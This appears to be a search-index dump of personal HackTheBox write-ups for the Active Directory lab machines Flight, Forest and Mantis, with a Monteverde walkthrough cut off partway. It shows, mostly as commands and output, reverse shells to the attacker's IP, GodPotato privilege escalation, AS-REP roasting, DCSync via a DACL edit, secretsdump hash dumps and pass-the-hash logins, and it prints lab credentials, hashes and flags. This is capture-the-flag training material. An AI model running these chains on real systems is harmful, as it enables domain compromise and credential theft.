HackTheBox","HackTheBox","Active Directory"]},{"location":"flight/#initial-access","title":"Initial Access","text":"<p>If we enumerate shares again, this is the senior dev, so he can now write to the <code>web</code> folder.</p> <p></p> <p>Get a PHP reverse shell and put it in the <code>web</code> folder.</p> <pre><code>smb: \\school.flight.htb\\images\\&gt; put shell.php\nputting file shell.php as \\school.flight.htb\\images\\shell.php (72.0 kb/s) (average 72.0 kb/s)\n</code></pre> <p>Start a listener and browse the file from the browser.</p> <p></p> <pre><code>$ rlwrap nc -lnvp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.11.187] 50615\nSOCKET: Shell has connected! PID: 2752\nMicrosoft Windows [Version 10.0.17763.2989]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\xampp\\htdocs\\school.flight.htb\\images&gt;whoami\nflight\\svc_apache\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"flight/#privilege-escalation","title":"Privilege Escalation","text":"<p>Now we need to pivot to <code>c.bum</code>, so upload <code>RunasC</code> and start a listener.</p> <pre><code>C:\\Users\\svc_apache&gt;.\\RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r 10.10.14.13:80\n</code></pre> <pre><code>$ rlwrap nc -lnvp 80\nlistening on [any] 80 ...\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.11.187] 52562\nMicrosoft Windows [Version 10.0.17763.2989]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nc.bum\n</code></pre> <p>Get the flag</p> <pre><code>C:\\Users\\C.Bum&gt;type desktop\\user.txt\ntype desktop\\user.txt\n3a89479b0fd44536ea02f85507029dc5\n</code></pre> <p>There is a <code>development</code> folder in <code>inetpub</code>. Looking at the listening ports, <code>8000</code> is open, so transfer <code>chisel</code> and let's make a port forwarding to access the web page.</p> <pre><code>C:\\inetpub\\development&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 1DF4-493D\n\n Directory of C:\\inetpub\\development\n\n05/10/2025  08:22 AM    &lt;DIR&gt;          .\n05/10/2025  08:22 AM    &lt;DIR&gt;          ..\n04/16/2018  02:23 PM             9,371 contact.html\n05/10/2025  08:22 AM    &lt;DIR&gt;          css\n05/10/2025  08:22 AM    &lt;DIR&gt;          fonts\n05/10/2025  08:22 AM    &lt;DIR&gt;          img\n04/16/2018  02:23 PM            45,949 index.html\n05/10/2025  08:22 AM    &lt;DIR&gt;          js\n               2 File(s)         55,320 bytes\n               6 Dir(s)   4,859,740,160 bytes free\n</code></pre> <pre><code>$ ./chisel server --port 8003 --reverse\n2025/05/10 10:03:47 server: Reverse tunnelling enabled\n2025/05/10 10:03:47 server: Fingerprint 2fkdO2BmMEPUopQC3z+sj9Kqh7vHPdCsFt7m+hVGdRM=\n2025/05/10 10:03:47 server: Listening on http://0.0.0.0:8003\n2025/05/10 10:04:14 server: session#1: tun: proxy#R:8001=&gt;8000: Listening\n\n\nC:\\Users\\C.Bum&gt;.\\chisel.exe client 10.10.14.13:8003 R:8001:127.0.0.1:8000\n.\\chisel.exe client 10.10.14.13:8003 R:8001:127.0.0.1:8000\n2025/05/10 08:05:46 client: Connecting to ws://10.10.14.13:8003\n2025/05/10 08:05:46 client: Connected (Latency 43.1244ms)\n</code></pre> <p></p> <p>The dev web page is like a new version, but there is not much to do.</p> <p>As this project runs on IIS, let's upload an ASPX reverse shell to pivot to another user.</p> <p></p> <pre><code>$ rlwrap nc -lnvp 8888\nlistening on [any] 8888 ...\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.11.187] 52613\nSpawn Shell...\nMicrosoft Windows [Version 10.0.17763.2989]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nc:\\windows\\system32\\inetsrv&gt;whoami\nwhoami\niis apppool\\defaultapppool\n</code></pre> <p>We have <code>seimpersonate</code> privilege with this one, so:</p> <pre><code>c:\\windows\\system32\\inetsrv&gt;whoami /priv\nwhoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeMachineAccountPrivilege     Add workstations to domain                Disabled\nSeAuditPrivilege              Generate security audits                  Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n</code></pre> <p>Upload <code>godpotato</code> and an <code>msfvenom</code> reverse shell and:</p> <pre><code>C:\\inetpub\\development\\development&gt;.\\GodPotato-NET4.exe -cmd \"reversepe.exe\"\n.\\GodPotato-NET4.exe -cmd \"reversepe.exe\"\n[*] CombaseModule: 0x140711164116992\n[*] DispatchTable: 0x140711166423104\n[*] UseProtseqFunction: 0x140711165799632\n[*] UseProtseqFunctionParamCount: 6\n[*] HookRPC\n[*] Start PipeServer\n[*] CreateNamedPipe \\\\.\\pipe\\790a2508-a3ed-4a86-b1f1-1e87b327a94f\\pipe\\epmapper\n[*] Trigger RPCSS\n[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046\n[*] DCOM obj IPID: 0000b002-0264-ffff-b0cd-52e077895586\n[*] DCOM obj OXID: 0xf7eb5dc12962d464\n[*] DCOM obj OID: 0xa6f9b61c4ed4586f\n[*] DCOM obj Flags: 0x281\n[*] DCOM obj PublicRefs: 0x0\n[*] Marshal Object bytes len: 100\n[*] UnMarshal Object\n[*] Pipe Connected!\n[*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] CurrentsImpersonationLevel: Impersonation\n[*] Start Search System Token\n[*] PID : 920 Token:0x808  User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation\n[*] Find System Token : True\n[*] UnmarshalObject: 0x80070776\n[*] CurrentUser: NT AUTHORITY\\SYSTEM\n[*] process start with pid 3340\n</code></pre> <pre><code>$ rlwrap nc -lnvp 2222                                                   \nlistening on [any] 2222 ...\nconnect to [10.10.14.13] from (UNKNOWN) [10.10.11.187] 52727\nwhoami\nMicrosoft Windows [Version 10.0.17763.2989]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\inetpub\\development\\development&gt;whoami\nnt authority\\system\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"flight/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>C:\\inetpub\\development\\development&gt;type C:\\users\\administrator\\desktop\\root.txt\ntype C:\\users\\administrator\\desktop\\root.txt\nf2440caf82a36206a471532abe18bcd6\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"forest/","title":"Forest","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"forest/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.161\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 20:26 CEST\nNmap scan report for 10.10.10.161\nHost is up (0.042s latency).\nNot shown: 65326 closed tcp ports (reset), 185 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain       Simple DNS Plus\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-08 18:33:14Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49671/tcp open  msrpc        Microsoft Windows RPC\n49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49677/tcp open  msrpc        Microsoft Windows RPC\n49684/tcp open  msrpc        Microsoft Windows RPC\n49704/tcp open  msrpc        Microsoft Windows RPC\n49958/tcp open  msrpc        Microsoft Windows RPC\nDevice type: general purpose\nRunning: Microsoft Windows 2016\nOS CPE: cpe:/o:microsoft:windows_server_2016\nOS details: Microsoft Windows Server 2016\nNetwork Distance: 2 hops\nService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: FOREST\n|   NetBIOS computer name: FOREST\\x00\n|   Domain name: htb.local\n|   Forest name: htb.local\n|   FQDN: FOREST.htb.local\n|_  System time: 2025-05-08T11:34:07-07:00\n| smb2-time: \n|   date: 2025-05-08T18:34:10\n|_  start_date: 2025-05-08T18:21:52\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: mean: 2h26m47s, deviation: 4h02m30s, median: 6m46s\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n</code></pre> <p>Enum users with <code>rpc</code> null session</p> <pre><code>user:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[DefaultAccount] rid:[0x1f7]\nuser:[$331000-VK4ADACQNUCA] rid:[0x463]\nuser:[SM_2c8eef0a09b545acb] rid:[0x464]\nuser:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]\nuser:[SM_75a538d3025e4db9a] rid:[0x466]\nuser:[SM_681f53d4942840e18] rid:[0x467]\nuser:[SM_1b41c9286325456bb] rid:[0x468]\nuser:[SM_9b69f1b9d2cc45549] rid:[0x469]\nuser:[SM_7c96b981967141ebb] rid:[0x46a]\nuser:[SM_c75ee099d0a64c91b] rid:[0x46b]\nuser:[SM_1ffab36a2f5f479cb] rid:[0x46c]\nuser:[HealthMailboxc3d7722] rid:[0x46e]\nuser:[HealthMailboxfc9daad] rid:[0x46f]\nuser:[HealthMailboxc0a90c9] rid:[0x470]\nuser:[HealthMailbox670628e] rid:[0x471]\nuser:[HealthMailbox968e74d] rid:[0x472]\nuser:[HealthMailbox6ded678] rid:[0x473]\nuser:[HealthMailbox83d6781] rid:[0x474]\nuser:[HealthMailboxfd87238] rid:[0x475]\nuser:[HealthMailboxb01ac64] rid:[0x476]\nuser:[HealthMailbox7108a4e] rid:[0x477]\nuser:[HealthMailbox0659cc1] rid:[0x478]\nuser:[sebastien] rid:[0x479]\nuser:[lucinda] rid:[0x47a]\nuser:[svc-alfresco] rid:[0x47b]\nuser:[andy] rid:[0x47e]\nuser:[mark] rid:[0x47f]\nuser:[santi] rid:[0x480]\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"forest/#initial-access","title":"Initial Access","text":"<p>Trying AS-REP roasting attack, we find a user with \"Do not require Kerberos preauthentication\".</p> <pre><code>$ impacket-GetNPUsers htb/ -dc-ip 10.10.10.161 -request -no-pass -usersfile users                           \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n...\n$krb5asrep$23$svc-alfresco@HTB:afacf1d07030d4fb9e9372d9e12c7028$abc439862e61f38c77f55f23762693538774e0636741f928507b6de782cd42b470ae6e4ad8386b7bf3425c79e911fe718371863643dd3fdb595ab8c4b4564333f192a6d0af86943fb03ef94316502e7dc781ab0d8af0c66be58f4247a350af427d6e235cacddefb995eee90550cbdcf59de86f6a09e5d7c723c409073e4f1d0651f66841f342770c960fcc8dd3b62e2fbb3d2603a8ce98b1c55f6527b1bc6c2d28bda6b88207430589af5bdc095ea1ec638741d199cdca30523f28d70c2572229260b29b9b64628f713d7fc0b36cdb168beb83f1dde9261d9aab241068b81208\n</code></pre> <p>With <code>hashcat</code>:</p> <pre><code>$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force\nhashcat (v6.2.6) starting\n\n$krb5asrep$23$svc-alfresco@HTB:afacf1d07030d4fb9e9372d9e12c7028$abc439862e61f38c77f55f23762693538774e0636741f928507b6de782cd42b470ae6e4ad8386b7bf3425c79e911fe718371863643dd3fdb595ab8c4b4564333f192a6d0af86943fb03ef94316502e7dc781ab0d8af0c66be58f4247a350af427d6e235cacddefb995eee90550cbdcf59de86f6a09e5d7c723c409073e4f1d0651f66841f342770c960fcc8dd3b62e2fbb3d2603a8ce98b1c55f6527b1bc6c2d28bda6b88207430589af5bdc095ea1ec638741d199cdca30523f28d70c2572229260b29b9b64628f713d7fc0b36cdb168beb83f1dde9261d9aab241068b81208:s3rvice\n</code></pre> <p><code>svc-alfresco:s3rvice</code></p> <p>Checking with <code>nxc</code>, we can <code>winrm</code></p> <pre><code>$ nxc winrm 10.10.10.161 -u svc-alfresco -p s3rvice\nWINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)\nWINRM       10.10.10.161    5985   FOREST           [+] htb.local\\svc-alfresco:s3rvice (Pwn3d!)\n</code></pre> <pre><code>$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice                         \n\nEvil-WinRM shell v3.7\n\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\desktop&gt; whoami\nhtb\\svc-alfresco\n</code></pre> <p>Get the flag</p> <pre><code>*Evil-WinRM* PS C:\\Users\\svc-alfresco\\desktop&gt; cat user.txt\nd1a91c765e7cb29e7525611d1e741dac\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"forest/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code>*Evil-WinRM* PS C:\\&gt; whoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID                                           Attributes\n========================================== ================ ============================================= ==================================================\nBUILTIN\\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group\n</code></pre> <p>The account <code>svc-alfresco</code> is a member of Account Operators. This group can change users that don't belong to protected groups with high privileges, but we can find a useful group.</p> <p>Let's scout the AD with <code>bloodhound-python</code> to identify a target.</p> <pre><code>$ bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -dc forest.htb.local -ns 10.10.10.161 --zip\n</code></pre> <p>There is a group called <code>Exchange Windows Permissions</code> that has <code>WriteDacl</code> to the domain, so we can add <code>svc-alfresco</code> to that group.</p> <p></p> <p>First, add the user to the group.</p> <pre><code>*Evil-WinRM* PS C:\\users\\svc-alfresco&gt; Add-ADGroupMember -Identity \"Exchange Windows Permissions\" -Members svc-alfresco\n</code></pre> <p>Now, using <code>impacket-dacledit</code>, give the user DCSync permissions over the domain.</p> <pre><code>$ impacket-dacledit htb.local/svc-alfresco:s3rvice -action write -rights DCSync -principal svc-alfresco -target-dn 'DC=htb,DC=local' -dc-ip 10.10.10.161\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] DACL backed up to dacledit-20250508-234706.bak\n[*] DACL modified successfully!\n</code></pre> <p>Now, using <code>secretsdump</code>, get the hashes.</p> <pre><code>$ impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.10.10.161\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nhtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::\n</code></pre> <p>Lastly, using the admin's hash, enter the DC via <code>evil-winrm</code>.</p> <pre><code>$ evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6\nEvil-WinRM shell v3.7 \n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\nhtb\\administrator\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"forest/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; type root.txt\nd76116e190c267673c6384c5805c8853\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"mantis/","title":"Mantis","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"mantis/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.10.52  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 18:13 CET\nNmap scan report for 10.10.10.52\nHost is up (0.042s latency).\nNot shown: 65508 closed tcp ports (reset)\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-22 17:13:57Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)\n464/tcp   open  tcpwrapped\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n1337/tcp  open  http         Microsoft IIS httpd 7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS7\n|_http-server-header: Microsoft-IIS/7.5\n1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM\n| ms-sql-info: \n|   10.10.10.52:1433: \n|     Version: \n|       name: Microsoft SQL Server 2014 RTM\n|       number: 12.00.2000.00\n|       Product: Microsoft SQL Server 2014\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2024-11-22T16:17:14\n|_Not valid after:  2054-11-22T16:17:14\n| ms-sql-ntlm-info: \n|   10.10.10.52:1433: \n|     Target_Name: HTB\n|     NetBIOS_Domain_Name: HTB\n|     NetBIOS_Computer_Name: MANTIS\n|     DNS_Domain_Name: htb.local\n|     DNS_Computer_Name: mantis.htb.local\n|     DNS_Tree_Name: htb.local\n|_    Product_Version: 6.1.7601\n|_ssl-date: 2024-11-22T17:15:02+00:00; 0s from scanner time.\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5722/tcp  open  msrpc        Microsoft Windows RPC\n8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: Tossed Salad - Blog\n|_http-open-proxy: Proxy might be redirecting requests\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc        Microsoft Windows RPC\n49161/tcp open  msrpc        Microsoft Windows RPC\n49165/tcp open  msrpc        Microsoft Windows RPC\n49173/tcp open  msrpc        Microsoft Windows RPC\n50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM\n| ms-sql-ntlm-info: \n|   10.10.10.52:50255: \n|     Target_Name: HTB\n|     NetBIOS_Domain_Name: HTB\n|     NetBIOS_Computer_Name: MANTIS\n|     DNS_Domain_Name: htb.local\n|     DNS_Computer_Name: mantis.htb.local\n|     DNS_Tree_Name: htb.local\n|_    Product_Version: 6.1.7601\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2024-11-22T16:17:14\n|_Not valid after:  2054-11-22T16:17:14\n|_ssl-date: 2024-11-22T17:15:02+00:00; 0s from scanner time.\n| ms-sql-info: \n|   10.10.10.52:50255: \n|     Version: \n|       name: Microsoft SQL Server 2014 RTM\n|       number: 12.00.2000.00\n|       Product: Microsoft SQL Server 2014\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 50255\nService Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled and required\n|_clock-skew: mean: 42m51s, deviation: 1h53m24s, median: 0s\n| smb-os-discovery: \n|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1\n|   Computer name: mantis\n|   NetBIOS computer name: MANTIS\\x00\n|   Domain name: htb.local\n|   Forest name: htb.local\n|   FQDN: mantis.htb.local\n|_  System time: 2024-11-22T12:14:56-05:00\n| smb2-time: \n|   date: 2024-11-22T17:14:53\n|_  start_date: 2024-11-22T16:17:04\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 85.74 seconds\n</code></pre> <p>We can't enumerate anything AD related, so I'll enumerate web directories in the two webs, <code>8080</code> and <code>1337</code>, and we get two results in <code>1337</code>.</p> <pre><code>$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.52:1337/ -t 70 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.52:1337/\n[+] Method:                  GET\n[+] Threads:                 70\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/orchard              (Status: 500) [Size: 3026]\n/secure_notes         (Status: 301) [Size: 160] [--&gt; http://10.10.10.52:1337/secure_notes/]\nProgress: 220559 / 220560 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre> <p>Going to <code>secure_notes</code>, we have</p> <p></p> <ul> <li>This part of the txt file looks like a hash or something: <code>NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx</code></li> <li>user: <code>admin</code> and database: <code>orcharddb</code></li> </ul> <p>Using <code>xxd</code>, we can convert hex to binary after base64 decoding it</p> <pre><code>$ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p\nm$$ql_S@_P@ssW0rd!\n</code></pre> <p>So we have <code>admin:m$$ql_S@_P@ssW0rd!</code></p> <p>We connect to the database with <code>dbeaver</code></p> <p></p> <p>And we get credentials for <code>james:J@m3s_P@ssW0rd!</code></p> <p>There are no more users apart from admin and no useful shares</p> <pre><code>$ rpcclient -U \"james\" 10.10.10.52  \nPassword for [WORKGROUP\\james]:\nrpcclient $&gt; enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[james] rid:[0x44f]\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"mantis/#initial-access","title":"Initial Access","text":"<p>So we try <code>goldenPac</code> from <code>impacket</code>:</p> <p>Add the domain and DC to <code>/etc/hosts</code> and using <code>impacket-goldenPac</code> we can enter as administrator.</p> <pre><code>$ impacket-goldenPac htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local -dc-ip 10.10.10.52\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103\n[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657\n[*] Attacking domain controller 10.10.10.52\n[*] 10.10.10.52 found vulnerable!\n[*] Requesting shares on mantis.htb.local.....\n[*] Found writable share ADMIN$\n[*] Uploading file qxzsvpAp.exe\n[*] Opening SVCManager on mantis.htb.local.....\n[*] Creating service VXop on mantis.htb.local.....\n[*] Starting service VXop.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"mantis/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flags</p> <pre><code>C:\\Windows\\system32&gt;type C:\\Users\\Administrator\\Desktop\\root.txt\n33427d458052f593baf71c6fdd9881d2\nC:\\Windows\\system32&gt;type C:\\Users\\james\\Desktop\\user.txt\n4e6c5d2a9d462a4abcaa01f16f9a9c41\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"monteverde/","title":"Monteverde","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"monteverde/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.172\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 00:19 CEST\nNmap scan report for 10.10.10.172\nHost is up (0.042s latency).\nNot shown: 65516 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        (generic dns response: SERVFAIL)\n| fingerprint-strings: \n|   DNS-SD-TCP: \n|     _services\n|     _dns-sd\n|     _udp\n|_    local\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-08 22:13:31Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49676/tcp open  msrpc         Microsoft Windows RPC\n49696/tcp open  msrpc         Microsoft Windows RPC\n49750/tcp open  msrpc         Microsoft Windows RPC\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: -6m44s\n| smb2-time: \n|   date: 2025-05-08T22:14:26\n|_  start_date: 